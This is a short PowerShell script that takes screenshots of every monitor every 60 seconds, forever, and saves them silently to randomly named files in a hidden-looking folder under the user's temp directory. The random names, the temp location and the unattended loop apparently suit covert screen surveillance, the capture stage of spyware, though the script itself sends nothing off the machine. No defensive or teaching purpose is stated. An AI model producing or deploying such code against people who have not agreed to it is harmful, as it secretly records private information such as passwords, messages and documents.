$save_path =  "$env:temp\AbLtcVKTqN"
Function  Get-Screen
{
    param
    (
        [String] $Path  = $save_path,
        [String] $FileName  = "RYTcCvgKPsEd" ,
        [Int] $ScreenNumber  = 0
    )
    
    if (-not (Test-Path -Path $save_path)){mkdir $save_path}
    
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 
    $Screens  = [System.Windows.Forms.Screen]::AllScreens
    If ( $ScreenNumber  -eq  0)
    {
        #Wszystkie screens
        ForEach  ( $Screen  in  $Screens )
        {
            $MaxWidth += $Screen.Bounds.Width
            if ( $maxheight  -lt  $Screen.Bounds.Height)
            {
                $Maxheight   = $Screen.Bounds.Height
            }
 
            $ScreensSize  = New-Object  PSObject  -property  @{
                X = 0
                Y = 0
                Width = $MaxWidth
                Height = $maxheight
            }
        }
    }
    elseif ( $ScreenNumber  -le  $Screens.Count)
    {
        #Tylko Specific screen
        if ( $ScreenNumber  -ge  2)
        {
            $sn  = $ScreenNumber
            while ( $sn -2 -ge  0)
            {
                $X += $Screens[$sn -2].Bounds.Width
                $sn--
            }
            $Y  = 0
        }
        else
        {
            $X  = 0
            $Y  = 0
        }
 
        $ScreensSize  = New-Object  PSObject  -property  @{
            X = $X
            Y = $Y
            Width = $Screens[$ScreenNumber -1].Bounds.Width
            Height = $Screens[$ScreenNumber -1].Bounds.Height
        }
    }
    else
    {
        Write-Warning  "Wrong screen"
    }
 
    $i  = 1
    Do
    {
        $Name  = $FileName
 
        if ( $i  -gt  1)
        {
            $Name  += "x$i"
        }
 
        $FULLPATH  = Join-Path  -path  $path  -ChildPath  "$Name.png"
        $i ++
    }
    while(Test-Path -path $FULLPATH)
 
    $Size  = New-Object  System.Drawing.Size $ScreensSize.width, $ScreensSize.Height
    $Bitmap  = New-Object  System.Drawing.Bitmap $ScreensSize.width, $ScreensSize.Height
    $Screenshot  = [Drawing.Graphics]::FromImage($Bitmap)

    $Screenshot.CopyFromScreen($ScreensSize.X, $ScreensSize.Y, 0, 0, $Size)

    $Bitmap.save($FULLPATH)
    
    
    $Screenshot.Dispose()
        
    $Bitmap.Dispose()
}


while ($true) {
    Get-Screen
    Start-Sleep -Seconds 60
}